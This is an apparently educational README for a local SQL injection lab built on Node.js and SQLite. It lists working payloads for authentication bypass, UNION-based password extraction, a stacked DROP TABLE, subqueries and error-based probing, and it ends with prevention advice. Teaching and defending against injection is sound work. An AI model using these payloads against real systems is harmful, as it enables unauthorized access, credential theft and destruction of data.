# SQL Injection Simulation

This document demonstrates a simple simulation of the most common SQL injection techniques that exploit vulnerabilities in a weak application.

---

## Environment Setup

Follow these steps to set up the environment for the simulation:

### Prerequisites
Ensure you have **Node.js** and **npm** installed on your system.

### Clone the Repository
```bash
git clone git@github.com:MarinosTBH/Cyber-attack-simulation-SQL-Injection.git
```

### Install Dependencies
```bash
npm install
```

### Run the Server
```bash
npm run dev
```

The application uses **Node.js** and **SQLite3** as its database.

---

## SQL Injection Techniques

### 1. Bypassing Password Authentication

#### Initial Query
```sql
SELECT id, username, password FROM user WHERE username = 'root' AND password = 'root';
```

#### Injection
Bypass the query using the following input:
```sql
' OR 1=1 --
```

#### Resulting Query
```sql
SELECT id, username, password FROM user WHERE username = '' OR 1=1 --' AND password = '';
```
This injection bypasses the password check, allowing unauthorized access.

#### Secure Alternative
To secure the application, use **parameterized queries** or **prepared statements**. This ensures user input is treated as data, not executable code.

---

### 2. Using `UNION` for Data Extraction

#### Exploit
Access the following URL:
```plaintext
http://localhost:3000/profile?id=1 UNION SELECT 1, username, password FROM user
```

#### Resulting Query
```sql
SELECT * FROM user WHERE id = 1 UNION SELECT 1, username, password FROM user;
```
This combines the result of the original query with data from the `user` table, exposing sensitive information such as usernames and passwords.

---

### 3. Using `--` for Commenting

#### Exploit
Access the following URL:
```plaintext
http://localhost:3000/profile?id=1; DROP TABLE user --
```

#### Resulting Query
```sql
SELECT * FROM user WHERE id = 1; DROP TABLE user --;
```
This executes the query to fetch user data and then drops the `user` table, effectively destroying the data.

---

### 4. Using Subqueries

#### Exploit
Access the following URL:
```plaintext
http://localhost:3000/profile?id=(SELECT MAX(id) FROM user)
```

#### Resulting Query
```sql
SELECT * FROM user WHERE id = (SELECT MAX(id) FROM user);
```
This retrieves the row with the highest `id` in the `user` table.

---

### 5. Extracting Data Using Error-Based Injection

#### Exploit
Access the following URL:
```plaintext
http://localhost:3000/profile?id=1' AND (SELECT 1/0) --
```

#### Resulting Query
```sql
SELECT * FROM user WHERE id = 1' AND (SELECT 1/0) --;
```
This forces the database to perform a division by zero, potentially revealing database structure or configuration details in the error message.

---

## Summary of Techniques
1. **Bypass Password Authentication**: Exploit logical conditions to bypass checks.
2. **Data Extraction with `UNION`**: Retrieve additional data by combining queries.
3. **Comment Injection with `--`**: Alter queries by injecting comments.
4. **Using Subqueries**: Extract specific information dynamically.
5. **Error-Based Injection**: Leverage error messages to gain insights into database structure.

---

### Recommendations to Prevent SQL Injection
- Always use **parameterized queries** or **prepared statements**.
- Validate and sanitize user inputs.
- Limit database user privileges.
- Use a Web Application Firewall (WAF) to detect and block malicious queries.
- Regularly update your dependencies and database systems.

By implementing these practices, you can safeguard your application against SQL injection attacks.


